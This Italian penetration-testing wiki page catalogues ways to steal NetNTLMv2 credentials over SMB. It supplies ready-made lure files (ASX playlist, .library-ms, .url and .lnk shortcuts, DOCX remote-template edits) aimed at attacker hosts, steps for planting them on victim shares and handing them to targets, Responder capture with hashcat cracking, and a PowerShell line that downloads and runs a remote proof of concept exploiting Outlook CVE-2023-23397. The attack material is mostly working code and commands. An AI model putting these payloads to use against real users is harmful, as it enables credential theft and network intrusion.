# Luoghi per rubare NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Consulta tutte le ottime idee da [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) dal download di un file microsoft word online alla fonte dei ntlm leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md e [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Share SMB scrivibile + UNC lures attivati da Explorer (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Se puoi **scrivere su una share che utenti o job schedulati sfogliano in Explorer**, deposita file i cui metadata puntano al tuo UNC (es. `\\ATTACKER\share`). Il rendering della cartella attiva **implicit SMB authentication** e leaks un **NetNTLMv2** verso il tuo listener.

1. **Generate lures** (copre SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Posizionali sulla writable share** (qualsiasi cartella che la vittima apre):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Listen and crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows può accedere a più file contemporaneamente; qualsiasi elemento che Explorer mostra in anteprima (`BROWSE TO FOLDER`) non richiede clic.

### Playlist di Windows Media Player (.ASX/.WAX)

Se riesci a far aprire o visualizzare in anteprima da un bersaglio una playlist di Windows Media Player che controlli, puoi leak Net‑NTLMv2 puntando la voce a un UNC path. WMP tenterà di recuperare il media referenziato tramite SMB e si autenticherà implicitamente.

Esempio di payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Flusso di raccolta e cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer gestisce in modo insicuro i file .library-ms quando vengono aperti direttamente da un archivio ZIP. Se la definizione della library punta a un percorso UNC remoto (ad es., \\attacker\share), il semplice sfogliare/avviare il file .library-ms all'interno dello ZIP provoca che Explorer enumeri l'UNC e invii l'autenticazione NTLM all'attaccante. Questo produce un NetNTLMv2 che può essere crackato offline o potenzialmente relayed.

Esempio minimo di .library-ms che punta a un UNC dell'attaccante
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- Crea il file .library-ms con l'XML sopra (imposta il tuo IP/hostname).
- Comprimi in ZIP (su Windows: Send to → Compressed (zipped) folder) e consegna lo ZIP al target.
- Avvia un listener per cattura NTLM e attendi che la vittima apra il .library-ms dall'interno dello ZIP.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows processava la extended MAPI property PidLidReminderFileParameter negli elementi del calendario. Se quella property puntava a un percorso UNC (es., \\attacker\share\alert.wav), Outlook contattava la share SMB quando il promemoria si attivava, leaking il Net‑NTLMv2 dell'utente senza alcun click. Questo è stato patched il 14 marzo 2023, ma rimane molto rilevante per flotte legacy/non aggiornate e per l'analisi di incidenti storici.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Lato Listener:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Note
- Alla vittima è necessario solo che Outlook for Windows sia in esecuzione quando il promemoria viene attivato.
- Il leak produce Net‑NTLMv2 adatto per offline cracking o relay (non pass‑the‑hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer visualizza automaticamente le icone dei collegamenti. Ricerche recenti hanno mostrato che, anche dopo la patch di Microsoft di aprile 2025 per le UNC‑icon shortcuts, era ancora possibile innescare l'autenticazione NTLM senza clic ospitando il target del collegamento su un percorso UNC e mantenendo l'icona locale (bypass della patch assegnato CVE‑2025‑50154). Basta visualizzare la cartella perché Explorer recuperi i metadata dalla destinazione remota, inviando NTLM al server SMB dell'attaccante.

Payload minimo Internet Shortcut (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Payload collegamento programma (.lnk) tramite PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Modalità di consegna
- Metti il collegamento in uno ZIP e fai sì che la vittima lo sfogli.
- Posiziona il collegamento su una share scrivibile che la vittima aprirà.
- Abbinalo ad altri file di lure nella stessa cartella in modo che Explorer mostri l'anteprima degli elementi.

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows carica i metadata di `.lnk` durante la **view/preview** (rendering dell'icona), non solo all'esecuzione. CVE‑2026‑25185 mostra un percorso di parsing dove i blocchi **ExtraData** fanno sì che la shell risolva un percorso dell'icona e tocchi il filesystem **during load**, emettendo NTLM outbound quando il percorso è remoto.

Condizioni chiave di trigger (osservate in `CShellLink::_LoadFromStream`):
- Include `DARWIN_PROPS` (`0xa0000006`) in ExtraData (passaggio che attiva la routine di aggiornamento icona).
- Include `ICON_ENVIRONMENT_PROPS` (`0xa0000007`) con `TargetUnicode` valorizzato.
- Il loader espande le variabili d'ambiente in `TargetUnicode` e chiama `PathFileExistsW` sul percorso risultante.

Se `TargetUnicode` si risolve in un percorso UNC (es. `\\attacker\share\icon.ico`), **la sola visualizzazione di una cartella** contenente il collegamento provoca autenticazione outbound. Lo stesso percorso di caricamento può essere attivato anche da **indexing** e **AV scanning**, rendendolo una superficie di leak pratica e no‑click.

Sono disponibili strumenti di ricerca (parser/generator/UI) nel progetto **LnkMeMaybe** per costruire/ispezionare queste strutture senza usare la GUI di Windows.


### Office remote template injection (.docx/.dotm) to coerce NTLM

I documenti Office possono fare riferimento a un template esterno. Se imposti il template allegato su un percorso UNC, l'apertura del documento autenticherà verso SMB.

Minimal DOCX relationship changes (all'interno di word/):

1) Edit word/settings.xml and add the attached template reference:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Modifica word/_rels/settings.xml.rels e punta rId1337 al tuo UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Ricrea il file in .docx e consegnalo. Avvia il tuo SMB capture listener e attendi l'apertura.

Per idee post-capture su relaying o abuso di NTLM, consulta:

{{#ref}}
README.md
{{#endref}}


## Riferimenti
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)


{{#include ../../banners/hacktricks-training.md}}
